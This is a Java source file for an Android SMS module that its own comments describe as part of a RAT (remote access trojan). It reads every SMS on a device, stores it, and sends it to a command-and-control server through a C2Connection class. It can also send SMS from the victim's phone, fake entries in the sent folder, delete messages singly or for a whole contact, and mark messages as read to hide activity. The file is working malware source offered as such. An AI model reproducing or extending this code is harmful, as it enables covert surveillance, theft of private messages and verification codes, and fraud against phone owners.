package com.tarjon.admin.utils;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.util.Log;

import com.tarjon.admin.db.DataStorage;
import com.tarjon.admin.network.C2Connection;

import org.json.JSONArray;
import org.json.JSONObject;

/**
 * Manages SMS-related operations for the RAT.
 * Allows reading, sending, and deleting SMS messages.
 */
public class SMSManager {

    private static final String TAG = "SMSManager";
    
    private Context context;
    private SmsManager smsManager;
    private EncryptionManager encryptionManager;
    private DataStorage dataStorage;
    private C2Connection c2Connection;
    
    public SMSManager(Context context) {
        this.context = context;
        this.smsManager = SmsManager.getDefault();
        this.encryptionManager = new EncryptionManager();
        this.dataStorage = new DataStorage(context);
        this.c2Connection = new C2Connection(context, encryptionManager);
    }
    
    /**
     * Get all SMS messages
     * @param limit Maximum number of messages to retrieve (0 for all)
     * @return JSON array with SMS messages
     */
    public String getAllSMS(int limit) {
        try {
            JSONArray smsArray = new JSONArray();
            ContentResolver contentResolver = context.getContentResolver();
            
            // Define the SMS URI
            Uri uri = Telephony.Sms.CONTENT_URI;
            
            // Define columns to retrieve
            String[] projection = new String[] {
                    Telephony.Sms._ID,
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.TYPE,
                    Telephony.Sms.READ
            };
            
            // Order by date descending
            String sortOrder = Telephony.Sms.DATE + " DESC";
            
            // Apply limit if specified
            if (limit > 0) {
                sortOrder += " LIMIT " + limit;
            }
            
            // Query SMS content provider
            Cursor cursor = contentResolver.query(uri, projection, null, null, sortOrder);
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject smsJson = new JSONObject();
                    String id = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms._ID));
                    String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    long date = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
                    int read = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.READ));
                    
                    smsJson.put("id", id);
                    smsJson.put("address", address);
                    smsJson.put("body", body);
                    smsJson.put("date", date);
                    smsJson.put("type", getSmsTypeName(type));
                    smsJson.put("read", (read == 1));
                    
                    smsArray.put(smsJson);
                } while (cursor.moveToNext());
                
                cursor.close();
            }
            
            // Store and send SMS data
            String smsData = smsArray.toString();
            dataStorage.saveSMS(smsData);
            c2Connection.sendSMS(smsData);
            
            return smsData;
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting SMS messages: " + e.getMessage(), e);
            return "[]";
        }
    }
    
    /**
     * Get SMS messages from a specific contact
     * @param phoneNumber Contact's phone number
     * @param limit Maximum number of messages to retrieve (0 for all)
     * @return JSON array with SMS messages
     */
    public String getSMSForContact(String phoneNumber, int limit) {
        try {
            JSONArray smsArray = new JSONArray();
            ContentResolver contentResolver = context.getContentResolver();
            
            // Define the SMS URI
            Uri uri = Telephony.Sms.CONTENT_URI;
            
            // Define columns to retrieve
            String[] projection = new String[] {
                    Telephony.Sms._ID,
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.TYPE,
                    Telephony.Sms.READ
            };
            
            // Define selection criteria
            String selection = Telephony.Sms.ADDRESS + " LIKE ?";
            String[] selectionArgs = new String[] { "%" + phoneNumber + "%" };
            
            // Order by date descending
            String sortOrder = Telephony.Sms.DATE + " DESC";
            
            // Apply limit if specified
            if (limit > 0) {
                sortOrder += " LIMIT " + limit;
            }
            
            // Query SMS content provider
            Cursor cursor = contentResolver.query(uri, projection, selection, selectionArgs, sortOrder);
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject smsJson = new JSONObject();
                    String id = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms._ID));
                    String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    long date = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
                    int read = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.READ));
                    
                    smsJson.put("id", id);
                    smsJson.put("address", address);
                    smsJson.put("body", body);
                    smsJson.put("date", date);
                    smsJson.put("type", getSmsTypeName(type));
                    smsJson.put("read", (read == 1));
                    
                    smsArray.put(smsJson);
                } while (cursor.moveToNext());
                
                cursor.close();
            }
            
            return smsArray.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting SMS for contact: " + e.getMessage(), e);
            return "[]";
        }
    }
    
    /**
     * Send an SMS message
     * @param phoneNumber Recipient's phone number
     * @param message SMS content
     * @return Success or error message
     */
    public String sendSMS(String phoneNumber, String message) {
        try {
            // Validate phone number and message
            if (phoneNumber == null || phoneNumber.trim().isEmpty()) {
                return "Error: Phone number cannot be empty";
            }
            
            if (message == null || message.trim().isEmpty()) {
                return "Error: Message cannot be empty";
            }
            
            // Check if message is too long and needs to be split
            if (message.length() > 160) {
                // Send multi-part message
                smsManager.sendMultipartTextMessage(
                        phoneNumber,
                        null,
                        smsManager.divideMessage(message),
                        null,
                        null
                );
            } else {
                // Send single message
                smsManager.sendTextMessage(
                        phoneNumber,
                        null,
                        message,
                        null,
                        null
                );
            }
            
            // Add message to sent folder
            addMessageToSent(phoneNumber, message);
            
            return "SMS sent to " + phoneNumber;
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending SMS: " + e.getMessage(), e);
            return "Error: " + e.getMessage();
        }
    }
    
    /**
     * Delete an SMS message by ID
     * @param messageId ID of the SMS message to delete
     * @return Success or error message
     */
    public String deleteSMS(String messageId) {
        try {
            // Validate message ID
            if (messageId == null || messageId.trim().isEmpty()) {
                return "Error: Message ID cannot be empty";
            }
            
            ContentResolver contentResolver = context.getContentResolver();
            Uri uri = Uri.parse("content://sms/" + messageId);
            
            // Delete the message
            int deletedRows = contentResolver.delete(uri, null, null);
            
            if (deletedRows > 0) {
                return "SMS deleted successfully";
            } else {
                return "No SMS found with ID " + messageId;
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error deleting SMS: " + e.getMessage(), e);
            return "Error: " + e.getMessage();
        }
    }
    
    /**
     * Delete all SMS messages from a specific contact
     * @param phoneNumber Contact's phone number
     * @return Success or error message
     */
    public String deleteAllSMSFromContact(String phoneNumber) {
        try {
            // Validate phone number
            if (phoneNumber == null || phoneNumber.trim().isEmpty()) {
                return "Error: Phone number cannot be empty";
            }
            
            ContentResolver contentResolver = context.getContentResolver();
            Uri uri = Telephony.Sms.CONTENT_URI;
            
            // Define selection criteria
            String selection = Telephony.Sms.ADDRESS + " LIKE ?";
            String[] selectionArgs = new String[] { "%" + phoneNumber + "%" };
            
            // Delete messages
            int deletedRows = contentResolver.delete(uri, selection, selectionArgs);
            
            if (deletedRows > 0) {
                return deletedRows + " SMS messages deleted from " + phoneNumber;
            } else {
                return "No SMS messages found for " + phoneNumber;
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error deleting SMS from contact: " + e.getMessage(), e);
            return "Error: " + e.getMessage();
        }
    }
    
    /**
     * Mark an SMS message as read
     * @param messageId ID of the SMS message to mark as read
     * @return Success or error message
     */
    public String markSMSAsRead(String messageId) {
        try {
            // Validate message ID
            if (messageId == null || messageId.trim().isEmpty()) {
                return "Error: Message ID cannot be empty";
            }
            
            ContentResolver contentResolver = context.getContentResolver();
            Uri uri = Uri.parse("content://sms/" + messageId);
            
            // Create content values to update
            ContentValues values = new ContentValues();
            values.put(Telephony.Sms.READ, true);
            
            // Update the message
            int updatedRows = contentResolver.update(uri, values, null, null);
            
            if (updatedRows > 0) {
                return "SMS marked as read";
            } else {
                return "No SMS found with ID " + messageId;
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error marking SMS as read: " + e.getMessage(), e);
            return "Error: " + e.getMessage();
        }
    }
    
    /**
     * Add sent message to the sent folder
     * @param phoneNumber Recipient's phone number
     * @param message SMS content
     */
    private void addMessageToSent(String phoneNumber, String message) {
        try {
            ContentResolver contentResolver = context.getContentResolver();
            ContentValues values = new ContentValues();
            values.put(Telephony.Sms.ADDRESS, phoneNumber);
            values.put(Telephony.Sms.BODY, message);
            values.put(Telephony.Sms.DATE, System.currentTimeMillis());
            values.put(Telephony.Sms.READ, 1);
            values.put(Telephony.Sms.TYPE, Telephony.Sms.MESSAGE_TYPE_SENT);
            
            contentResolver.insert(Telephony.Sms.CONTENT_URI, values);
        } catch (Exception e) {
            Log.e(TAG, "Error adding message to sent folder: " + e.getMessage(), e);
            // Continue execution even if this fails
        }
    }
    
    /**
     * Get SMS type name from type code
     * @param type SMS type code
     * @return SMS type name
     */
    private String getSmsTypeName(int type) {
        switch (type) {
            case Telephony.Sms.MESSAGE_TYPE_INBOX:
                return "inbox";
            case Telephony.Sms.MESSAGE_TYPE_SENT:
                return "sent";
            case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                return "outbox";
            case Telephony.Sms.MESSAGE_TYPE_DRAFT:
                return "draft";
            case Telephony.Sms.MESSAGE_TYPE_FAILED:
                return "failed";
            case Telephony.Sms.MESSAGE_TYPE_QUEUED:
                return "queued";
            default:
                return "unknown";
        }
    }
}